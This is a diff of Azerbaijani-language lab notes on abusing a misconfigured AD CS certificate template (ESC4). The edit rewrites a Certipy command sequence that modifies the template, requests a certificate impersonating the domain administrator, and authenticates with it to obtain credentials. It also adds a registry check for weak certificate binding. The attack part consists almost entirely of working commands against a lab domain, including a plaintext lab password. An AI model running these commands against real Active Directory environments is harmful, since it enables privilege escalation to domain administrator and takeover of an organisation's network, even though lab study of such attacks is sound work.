@@ -22,6 +22,7 @@ Zəif ACL            -    Aşağıdakılardan biri şablonda mövcuddur:
                            WriteDACL / WriteOwner / FullControl
 İstifadəçi          -    Domain Users, Authenticated Users və ya hər hansı geniş qrup
 Şablon               -    CA-ya qoşulmuş, aktiv vəziyyətdə
+StrongBinding       -    reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement    --->    0x0
 ```
 
 ### Kritik ACL Hüquqları
@@ -72,56 +73,26 @@ $templatePath = "AD:\CN=VulnESC4,CN=Certificate Templates,CN=Public Key Services
 ## ESC4 Exploitation with Certipy
 
 ```powershell
+certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
+    -dc-ip 192.168.0.150 \
+    -template 'VulnESC4' \
+    -save-old -ldap-scheme ldap
+
 # Step 1 — Şablonun mövcud konfiqurasiyasını yedəklə
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'VulnESC4' \
-    -save-old \
-    -ldap-scheme ldap
+certipy-ad req -u 'test@certificate.local' \
+  -p 'sako2005!' \          
+  -dc-ip 192.168.0.150 \     
+  -target WIN-CERTIFICATE.certificate.local \
+  -ca 'certificate-WIN-CERTIFICATE-CA' \
+  -template 'VulnESC4' \
+  -upn 'administrator@certificate.local'
 
-# Output: VulnESC4.json  (orijinal konfiqurasiya saxlanılır)
-
-# Step 2 — Şablonu ESC1-ə çevir (Client Auth + ENROLLEE_SUPPLIES_SUBJECT)
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'VulnESC4' \
-    -configuration VulnESC4.json \
-    -ldap-scheme ldap
-
-# Alternativ — birbaşa vulnerable hala gətir (yedəksiz)
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'VulnESC4' \
-    -ldap-scheme ldap
-
-# Step 3 — Administrator adına SAN ilə sertifikat al (ESC1 kimi)
-certipy-ad req -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -target 192.168.0.150 \
-    -ca 'certificate-WIN-CERTIFICATE-CA' \
-    -template 'VulnESC4' \
-    -upn 'administrator@certificate.local' \
-    -ldap-scheme ldap
-
-# Output: administrator.pfx
-
-# Step 4 — NT Hash al
+# Step 2 — Auth
 certipy-ad auth \
-    -pfx administrator.pfx \
-    -dc-ip 192.168.0.150
-
-# Step 4 (alternativ) — TGT al
-certipy-ad auth \
-    -pfx administrator.pfx \
-    -domain certificate.local \
-    -dc-ip 192.168.0.150
-
-# Step 5 (opsional) — Şablonu orijinal vəziyyətinə qaytar
-certipy-ad template -u 'test@certificate.local' -p 'sako2005!' \
-    -dc-ip 192.168.0.150 \
-    -template 'VulnESC4' \
-    -configuration VulnESC4.json \
-    -ldap-scheme ldap
+  -pfx 'administrator.pfx' \
+  -username 'administrator' \
+  -domain 'certificate.local' \
+  -dc-ip 192.168.0.150
 ```
 
 ---
